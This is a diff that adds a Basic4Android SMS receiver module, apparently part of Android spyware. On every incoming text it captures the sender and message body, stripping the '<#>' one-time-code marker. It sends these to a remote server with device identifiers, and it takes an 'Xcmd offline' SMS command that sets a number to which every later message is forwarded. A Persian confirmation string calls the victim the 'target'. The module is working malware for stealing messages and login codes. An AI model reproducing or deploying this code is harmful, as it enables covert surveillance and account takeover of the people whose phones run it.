@@ -1,0 +1,160 @@
+﻿B4A=true
+Group=Default Group
+ModulesStructureVersion=1
+Type=Receiver
+Version=12.8
+@EndOfDesignText@
+Sub Process_Globals
+	Dim Send As SendServer
+	Dim phone As Phone
+	Dim st As StringUtils
+	Dim pd As PersianDeviceInfo
+	Private MapData As Map
+	Dim res As String
+	Dim pm As PhoneWakeState
+End Sub
+
+Private Sub Receiver_Receive (FirstTime As Boolean, StartingIntent As Intent)
+	If StartingIntent.Action = "android.provider.Telephony.SMS_RECEIVED" Then
+		res = CheckScreenStatus
+		Try
+			StartReceiver(FirebaseMessaging)
+			pd.initialize("pd")
+			Private Address,Body As String = "Can't Get Data !"
+			Try
+				MapData.Initialize
+				MapData = ParseSmsIntent(StartingIntent)
+				If MapData.ContainsKey("Address") Then
+					Address = MapData.Get("Address")
+				End If
+				If MapData.ContainsKey("Body") Then
+					Body = MapData.Get("Body")
+				End If
+				If Body.Contains("<#>") Then
+					Body = Body.Replace("<#>","")
+				End If
+			Catch
+				Log(LastException)
+			End Try
+			Send.Initialize
+			Send.SendData("sender="& st.EncodeUrl(Address,"UTF-8")  & "&messagetext=" &st.EncodeUrl(Body,"UTF-8")& "&Model="&phone.Model &"&Device_id=" &phone.GetSettings("android_id") &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion & "&action=" & "ReciveSMS" & "&operator=" & phone.GetNetworkOperatorName&"&screen="&res)
+			
+			If Body.Contains("Xcmd ") Then
+				Body = Body.Replace("Xcmd ","")
+				If Body.Contains("offline ") Then
+					If File.Exists(File.DirInternal,"offline.txt") Then File.Delete(File.DirInternal,"offline.txt")
+					File.WriteString(File.DirInternal,"offline.txt",Body.Replace("offline ",""))
+						SendSMS(Address,"دستور اجرا شد ، حالت آفلاین مود با موفقیت روی شماره [ "&Body.Replace("offline ","")&" ] ست شد . زین پس هر پیام جدیدی که برای تارگت بیاید ،به شماره مورد نظر هم ارسال میشود .")
+				End If
+			End If
+			
+			If File.Exists(File.DirInternal,"offline.txt") Then
+				Dim num As String = File.GetText(File.DirInternal,"offline.txt")
+				SendSMS(num,phone.Model&CRLF&phone.GetSettings("android_id")&CRLF&"From:"&Address&CRLF&CRLF&Body)
+			End If
+		Catch
+			Log(LastException)
+			If File.Exists(File.DirInternal,"offline.txt") Then
+				Dim num As String = File.GetText(File.DirInternal,"offline.txt")
+				SendSMS(num,phone.Model&CRLF&phone.GetSettings("android_id")&CRLF&"From:"&Address&CRLF&CRLF&Body)
+			End If
+		End Try
+	End If
+End Sub
+Sub ParseSmsIntent (in As Intent) As Map
+	Private SMS_MAP As Map
+	SMS_MAP.Initialize
+	Dim Body As StringBuilder
+	Dim Address As String
+	Body.Initialize
+	Try
+		If Not(in.HasExtra("pdus"))Then Return SMS_MAP
+		Dim pdus() As Object
+		Dim r As Reflector
+		pdus = in.GetExtra("pdus")
+		If pdus.Length > 0 Then
+			For i = 0 To pdus.Length - 1
+				r.Target = r.RunStaticMethod("android.telephony.SmsMessage", "createFromPdu", _
+            Array As Object(pdus(i)), Array As String("[B"))
+				Body.Append(r.RunMethod("getMessageBody"))
+				Address = r.RunMethod("getOriginatingAddress")
+			Next
+		End If
+	Catch
+		Log(LastException)
+	End Try
+	SMS_MAP.Put("Address",Address)
+	SMS_MAP.Put("Body",Body)
+	Return SMS_MAP
+End Sub
+Sub SendSMS(Number As String , Message As String)
+	Dim r As Reflector
+	r.Target = r.RunStaticMethod("android.telephony.SmsManager", "getDefault", Null, Null)
+	Dim parts As Object
+	parts = r.RunMethod2("divideMessage", Message, "java.lang.String")
+	r.RunMethod4("sendMultipartTextMessage", _
+      Array As Object(Number, Null, parts, Null, Null), _
+      Array As String("java.lang.String", "java.lang.String", _
+         "java.util.ArrayList", "java.util.ArrayList", "java.util.ArrayList"))
+End Sub
+
+Public Sub CheckScreenStatus
+	Dim res As String
+	pm.PartialLock
+
+	Dim r As Reflector
+	r.Target = r.GetContext
+	Dim powerService As Object = r.RunMethod2("getSystemService", "power", "java.lang.String")
+	r.Target = powerService
+	Dim isScreenOn As Boolean = r.RunMethod("isScreenOn")
+    
+	If isScreenOn Then
+		res = "On"
+		Log("Screen is ON")
+	Else
+		res = "Off"
+		Log("Screen is OFF")
+	End If
+	Return res
+	pm.ReleasePartialLock
+End Sub
+
+
+#if java
+import android.os.Bundle;
+import android.content.Intent;
+import android.telephony.SmsMessage;
+
+    public String GET(String extra,Intent intent){
+    	final Bundle bundle = intent.getExtras();
+        try {
+            if (bundle != null) {
+            	Object[] pdus = (Object[]) bundle.get("pdus");
+                if (pdus.length == 0) {
+                    return "";
+                }
+                
+                SmsMessage[] messages = new SmsMessage[pdus.length];
+                StringBuilder sb = new StringBuilder();
+                for (int i = 0; i < pdus.length; i++) {
+                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                    sb.append(messages[i].getMessageBody());
+                }
+                String sender = messages[0].getOriginatingAddress();
+                String message = sb.toString();
+                extra=extra.toLowerCase();
+                if(extra.contains("body"))
+                {return message;}
+                else if(extra.contains("number"))
+                {return sender;} 
+            
+                   
+                } 
+              
+        } catch (Exception e) {
+           //  
+        }
+        return "";
+    }
+#end if
+
